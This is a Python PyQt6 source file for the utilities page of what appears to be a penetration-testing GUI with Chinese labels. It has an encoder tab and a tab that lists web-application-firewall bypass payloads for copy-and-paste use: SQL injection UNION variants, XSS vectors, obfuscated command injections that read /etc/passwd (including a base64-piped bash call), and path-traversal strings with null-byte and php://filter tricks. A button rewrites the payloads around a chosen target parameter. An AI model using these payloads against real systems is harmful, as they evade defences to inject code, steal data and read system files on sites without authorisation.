import base64
import html
import urllib.parse
import codecs
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QFrame,
    QPushButton, QTextEdit, QLineEdit, QComboBox, QGroupBox,
    QTabWidget, QSpinBox, QCheckBox
)
from PyQt6.QtCore import Qt


# === Encoding/Decoding Functions ===

def encode_base64(text):
    return base64.b64encode(text.encode("utf-8")).decode("ascii")

def decode_base64(text):
    return base64.b64decode(text.encode("ascii")).decode("utf-8", errors="replace")

def encode_url(text):
    return urllib.parse.quote(text, safe="")

def decode_url(text):
    return urllib.parse.unquote(text)

def encode_html(text):
    return html.escape(text)

def decode_html(text):
    return html.unescape(text)

def encode_hex(text):
    return text.encode("utf-8").hex()

def decode_hex(text):
    text = text.replace(" ", "").replace("0x", "").replace("\\x", "")
    return bytes.fromhex(text).decode("utf-8", errors="replace")

def encode_unicode(text):
    return "".join(f"\\u{ord(c):04x}" for c in text)

def decode_unicode(text):
    return text.encode("utf-8").decode("unicode_escape", errors="replace")

def encode_rot13(text):
    return codecs.encode(text, "rot_13")

def encode_xor(text, key=0x42):
    return " ".join(f"{b ^ key:02x}" for b in text.encode("utf-8"))

def decode_xor(hex_str, key=0x42):
    hex_str = hex_str.replace(" ", "")
    data = bytes.fromhex(hex_str)
    return "".join(chr(b ^ key) for b in data)

def encode_chr(text):
    """PHP chr() encoding: chr(104)+chr(101)+..."""
    return "+".join(f"chr({ord(c)})" for c in text)

def encode_js_charcode(text):
    """JavaScript String.fromCharCode encoding"""
    return f"String.fromCharCode({','.join(str(ord(c)) for c in text)})"


# === WAF Bypass Payloads ===

WAF_BYPASS_PAYLOADS = {
    "SQL 注入绕过": [
        ("UNION SELECT 空格绕过", "UNION/**/SELECT"),
        ("UNION SELECT 大小写", "UnIoN/**/SeLeCt"),
        ("注释符绕过", "1'/*!50000UNION*//*!50000SELECT*/1,2,3--"),
        ("双重编码", "1%2527%2520UNION%2520SELECT"),
        ("HPP 参数污染", "id=1&id=2' UNION SELECT 1,2,3--"),
        ("换行符绕过", "1' UNION%0aSELECT 1,2,3--"),
        ("内联注释", "1'/*!UNION*/!SELECT*/1,2,3--"),
        ("JSON 绕过", "' OR JSON_EXTRACT('{\"a\":1}','$.a')=1--"),
    ],
    "XSS 绕过": [
        ("大小写绕过", "<ScRiPt>alert(1)</ScRiPt>"),
        ("标签闭合绕过", "\";alert(1);//"),
        ("事件处理器", "<img src=x onerror=alert(1)>"),
        ("SVG 绕过", "<svg/onload=alert(1)>"),
        ("编码绕过", "<a href=\"javascript:alert(1)\">click</a>"),
        ("Unicode 绕过", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
        ("模板字符串", "{{constructor.constructor('alert(1)')()}}"),
        ("eval 绕过", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"),
    ],
    "命令注入绕过": [
        ("变量拼接", "${IFS}cat${IFS}/etc/passwd"),
        ("通配符绕过", "cat /etc/p???wd"),
        ("反引号执行", "cat `/etc/passwd`"),
        ("Base64 绕过", "bash<<<$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)"),
        ("分号绕过", "a=ca;b=t;$a$b /etc/passwd"),
        ("换行绕过", "c'a't /etc/passwd"),
        ("十六进制绕过", "cat $(echo -e '\\x2fetc\\x2fpasswd')"),
        ("引号绕过", "c\"a\"t /etc/pas\"s\"wd"),
    ],
    "路径遍历绕过": [
        ("双重编码", "..%252f..%252f..%252fetc/passwd"),
        ("Unicode 绕过", "..%c0%af..%c0%af..%c0%afetc/passwd"),
        ("空字节截断", "../../../etc/passwd%00.jpg"),
        ("引号绕过", "..\"/../\"..\"/../\"etc/passwd"),
        ("超长序列", "....//....//....//etc/passwd"),
        ("PHP 伪协议", "php://filter/convert.base64-encode/resource=index.php"),
    ],
}


class ToolsPage(QWidget):
    def __init__(self, engine, parent=None):
        super().__init__(parent)
        self.engine = engine
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(12)
        layout.setContentsMargins(20, 20, 20, 20)

        title = QLabel("实用工具")
        title.setObjectName("title")
        layout.addWidget(title)

        tabs = QTabWidget()
        tabs.addTab(self._build_encoder_tab(), "编码/解码")
        tabs.addTab(self._build_waf_tab(), "WAF 绕过")
        layout.addWidget(tabs)

    # --- Encoder Tab ---
    def _build_encoder_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setSpacing(10)

        # Mode selector
        mode_row = QHBoxLayout()
        mode_row.addWidget(QLabel("操作:"))
        self.enc_mode = QComboBox()
        self.enc_mode.addItem("编码", "encode")
        self.enc_mode.addItem("解码", "decode")
        self.enc_mode.setFixedWidth(100)
        mode_row.addWidget(self.enc_mode)

        mode_row.addWidget(QLabel("算法:"))
        self.enc_algo = QComboBox()
        algorithms = [
            ("Base64", "base64"),
            ("URL Encode", "url"),
            ("HTML Entity", "html"),
            ("Hex", "hex"),
            ("Unicode (\\uXXXX)", "unicode"),
            ("ROT13", "rot13"),
            ("XOR (key=0x42)", "xor"),
            ("PHP chr()", "chr"),
            ("JS fromCharCode", "js_charcode"),
        ]
        for name, code in algorithms:
            self.enc_algo.addItem(name, code)
        self.enc_algo.setFixedWidth(180)
        mode_row.addWidget(self.enc_algo)

        mode_row.addStretch()

        btn_encode = QPushButton("执行")
        btn_encode.setObjectName("primary")
        btn_encode.clicked.connect(self._do_encode)
        mode_row.addWidget(btn_encode)

        layout.addLayout(mode_row)

        # Input
        input_group = QGroupBox("输入")
        input_layout = QVBoxLayout(input_group)
        self.enc_input = QTextEdit()
        self.enc_input.setPlaceholderText("输入要编码/解码的文本...")
        self.enc_input.setMaximumHeight(150)
        input_layout.addWidget(self.enc_input)
        layout.addWidget(input_group)

        # Output
        output_group = QGroupBox("输出")
        output_layout = QVBoxLayout(output_group)
        self.enc_output = QTextEdit()
        self.enc_output.setReadOnly(True)
        self.enc_output.setPlaceholderText("结果将显示在这里...")
        self.enc_output.setMaximumHeight(150)
        output_layout.addWidget(self.enc_output)

        btn_row = QHBoxLayout()
        btn_copy = QPushButton("复制结果")
        btn_copy.clicked.connect(self._copy_output)
        btn_row.addWidget(btn_copy)
        btn_clear = QPushButton("清空")
        btn_clear.clicked.connect(lambda: (self.enc_input.clear(), self.enc_output.clear()))
        btn_row.addWidget(btn_clear)
        btn_row.addStretch()
        btn_swap = QPushButton("输入输出互换")
        btn_swap.clicked.connect(self._swap_io)
        btn_row.addWidget(btn_swap)
        output_layout.addLayout(btn_row)

        layout.addWidget(output_group)
        layout.addStretch()
        return widget

    def _do_encode(self):
        text = self.enc_input.toPlainText()
        if not text:
            return

        mode = self.enc_mode.currentData()
        algo = self.enc_algo.currentData()

        funcs = {
            "base64": (encode_base64, decode_base64),
            "url": (encode_url, decode_url),
            "html": (encode_html, decode_html),
            "hex": (encode_hex, decode_hex),
            "unicode": (encode_unicode, decode_unicode),
            "rot13": (encode_rot13, encode_rot13),
            "xor": (encode_xor, decode_xor),
            "chr": (encode_chr, None),
            "js_charcode": (encode_js_charcode, None),
        }

        enc_func, dec_func = funcs.get(algo, (None, None))

        try:
            if mode == "encode" and enc_func:
                result = enc_func(text)
            elif mode == "decode" and dec_func:
                result = dec_func(text)
            elif mode == "decode" and not dec_func:
                result = f"[!] {self.enc_algo.currentText()} 不支持解码"
            else:
                result = "未知操作"
            self.enc_output.setPlainText(result)
        except Exception as e:
            self.enc_output.setPlainText(f"[错误] {e}")

    def _copy_output(self):
        text = self.enc_output.toPlainText()
        if text:
            from PyQt6.QtWidgets import QApplication
            QApplication.clipboard().setText(text)

    def _swap_io(self):
        inp = self.enc_input.toPlainText()
        out = self.enc_output.toPlainText()
        self.enc_input.setPlainText(out)
        self.enc_output.setPlainText(inp)

    # --- WAF Bypass Tab ---
    def _build_waf_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setSpacing(10)

        # Category selector
        cat_row = QHBoxLayout()
        cat_row.addWidget(QLabel("分类:"))
        self.waf_category = QComboBox()
        for cat in WAF_BYPASS_PAYLOADS:
            self.waf_category.addItem(cat)
        self.waf_category.currentTextChanged.connect(self._update_waf_list)
        cat_row.addWidget(self.waf_category)
        cat_row.addStretch()
        layout.addLayout(cat_row)

        # Payload list
        self.waf_list = QTextEdit()
        self.waf_list.setReadOnly(True)
        self.waf_list.setObjectName("terminal")
        layout.addWidget(self.waf_list)

        # Actions
        btn_row = QHBoxLayout()
        btn_copy_all = QPushButton("复制全部")
        btn_copy_all.clicked.connect(self._copy_waf_payloads)
        btn_row.addWidget(btn_copy_all)
        btn_row.addStretch()

        self.waf_target = QLineEdit()
        self.waf_target.setPlaceholderText("输入目标参数名（如 id, search）")
        self.waf_target.setFixedWidth(200)
        btn_row.addWidget(self.waf_target)

        btn_replace = QPushButton("替换目标")
        btn_replace.clicked.connect(self._replace_waf_target)
        btn_row.addWidget(btn_replace)
        layout.addLayout(btn_row)

        self._update_waf_list()
        return widget

    def _update_waf_list(self):
        cat = self.waf_category.currentText()
        payloads = WAF_BYPASS_PAYLOADS.get(cat, [])
        lines = []
        for name, payload in payloads:
            lines.append(f"# {name}")
            lines.append(payload)
            lines.append("")
        self.waf_list.setPlainText("\n".join(lines))

    def _copy_waf_payloads(self):
        text = self.waf_list.toPlainText()
        if text:
            from PyQt6.QtWidgets import QApplication
            QApplication.clipboard().setText(text)

    def _replace_waf_target(self):
        target = self.waf_target.text().strip()
        if not target:
            return
        cat = self.waf_category.currentText()
        payloads = WAF_BYPASS_PAYLOADS.get(cat, [])
        lines = []
        for name, payload in payloads:
            replaced = payload.replace("id", target).replace("search", target)
            lines.append(f"# {name}")
            lines.append(replaced)
            lines.append("")
        self.waf_list.setPlainText("\n".join(lines))
